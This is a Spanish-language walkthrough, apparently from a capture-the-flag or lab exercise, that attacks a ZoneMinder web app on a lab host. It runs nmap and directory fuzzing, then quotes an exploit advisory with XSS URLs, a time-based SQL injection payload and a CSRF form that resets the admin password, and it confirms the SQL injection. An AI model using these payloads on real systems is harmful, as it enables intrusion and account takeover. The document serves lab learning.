

Realizamos un *nmap* para ver los puertos abiertos y ver qué están corriendo

```bash
nmap -sCV -p- --open -n -Pn -vvv IP_víctima -oN nom_resultado.txt
```

![](../../Imágenes/Pasted%20image%2020260107031133.png)


Encontramos 5 puertos abiertos:

### 21 FTP
### 22 SSH
### 80 HTTP

### 3305 HTTP

### 8080 HTTP

![](../../Imágenes/Pasted%20image%2020260107031155.png)


Entramos a la página web del puerto 80 y vemos el panel de inicio de sesión

![](../../Imágenes/Pasted%20image%2020260107031904.png)


Miramos a ver si *Wappalyzer* nos da algo de información interesante sobre las tecnologías que usa la web

![](../../Imágenes/Pasted%20image%2020260107031927.png)


Se mira el código fuente en busca de pistas o información, pero no se encuentra nada

![](../../Imágenes/Pasted%20image%2020260107031942.png)


 Intentamos a través del panel de inicio de sesión inicial, el cual, no podemos acceder con credenciales por defecto

![](../../Imágenes/Pasted%20image%2020260107032045.png)


![](../../Imágenes/Pasted%20image%2020260107032309.png)


![](../../Imágenes/Pasted%20image%2020260107032351.png)


Realizamos un *fuzzeo* a los directorios de la primera web (puerto 80)

```bash
feroxbuster --url http://$IP_victima -w diccionario
```

![](../../Imágenes/Pasted%20image%2020260107033632.png)


```bash
gobuster -u http://$IP_victima -w diccionario
```

![](../../Imágenes/Pasted%20image%2020260107034016.png)


Gracias a *gobuster* encontramos el directorio de "/zm"

![](../../Imágenes/Pasted%20image%2020260107034038.png)


![](../../Imágenes/Pasted%20image%2020260108022938.png)


Buscamos algún *exploit*

```bash
searchsploit servicio
```

![](../../Imágenes/Pasted%20image%2020260107043330.png)


Miramos en qué consiste el *exploit*

![](../../Imágenes/Pasted%20image%2020260108024823.png)


![](../../Imágenes/Pasted%20image%2020260108024957.png)


```ruby
1)Cross Site Scripting (XSS)
Reflected: http://192.168.241.131/zm/index.php?view=request&request=log&task=download&key=a9fef1f4&format=texty9fke%27%3Chtml%3E%3Chead%3E%3C/head%3E%3Cbody%3E%3Cscript%3Ealert(1)%3C%2fscript%3E%3C/body%3E%3C/html%3Eayn2h
Reflected without authentication: http://192.168.241.131/zm/index.php/LSE4%22%3E%3Cscript%3Ealert(1)%3C/script%3ELSE
Stored: Creating a new monitor using the name "Bla<script>alert(1)</script>". There is only a clientside protection.

2)SQL Injection
Example Url:http://192.168.241.131/zm/index.php
Parameter: limit (POST)
    Type: stacked queries
    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
    Payload: view=request&request=log&task=query&limit=100;(SELECT *
FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
Easy exploitable using sqlmap.

3)Session Fixation
After a successful authentication the Session Cookie ZMSESSID remains the same.
Example: Cookie before the login = ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2 after successful login
ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2

4)No CSRF Proctection
A possible CSRF attack form, which changes the password of the admin (uid=1), if the corresponding user activates it.
<html>
  <body>
    <form action="http://192.168.241.131/zm/index.php" method="POST">
      <input type="hidden" name="view" value="user" />
      <input type="hidden" name="action" value="user" />
      <input type="hidden" name="uid" value="1" />
      <input type="hidden" name="newUser&#91;MonitorIds&#93;" value="" />
      <input type="hidden" name="newUser&#91;Username&#93;" value="admin" />
      <input type="hidden" name="newUser&#91;Password&#93;"
value="admin1" />
      <input type="hidden" name="conf&#95;password" value="admin1" />
      <input type="hidden" name="newUser&#91;Language&#93;" value="" />
      <input type="hidden" name="newUser&#91;Enabled&#93;" value="1" />
      <input type="hidden" name="newUser&#91;Stream&#93;" value="View" />
      <input type="hidden" name="newUser&#91;Events&#93;" value="Edit" />
      <input type="hidden" name="newUser&#91;Control&#93;" value="Edit" />
      <input type="hidden" name="newUser&#91;Monitors&#93;" value="Edit" />
      <input type="hidden" name="newUser&#91;Groups&#93;" value="Edit" />
      <input type="hidden" name="newUser&#91;System&#93;" value="Edit" />
      <input type="hidden" name="newUser&#91;MaxBandwidth&#93;" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```


Según el exploit podemos realizar una *time based SQLi* en el método POST (la cabecera de `Content-Type: application/x-www-form-urlencoded`)

![](../../Imágenes/Pasted%20image%2020260108050529.png)


Como vemos la *query* de la imagen anterior tarda unos 5 segundos que es lo que le hemos indicado en ejecutarse, por lo que es vulnerable a inyecciones *SQL*

![](../../Imágenes/Pasted%20image%2020260108050538.png)


Ahora que sabemos que es vulnerable a inyecciones *sql*, intentamos inyectar código y ver el resultado gracias a éste post de LinkedIn --> https://www.linkedin.com/posts/mind-dweller_hackers-sqli-injection-activity-7325478519809986561-_YCT

![](../../Imágenes/Pasted%20image%2020260108050934.png)


Al haber subido la respuesta al directorio /var/www/html tenemos que acceder al puerto :3305 donde existe dicha ruta

![](../../Imágenes/Pasted%20image%2020260108051017.png)


![](../../Imágenes/Pasted%20image%2020260108050924.png)






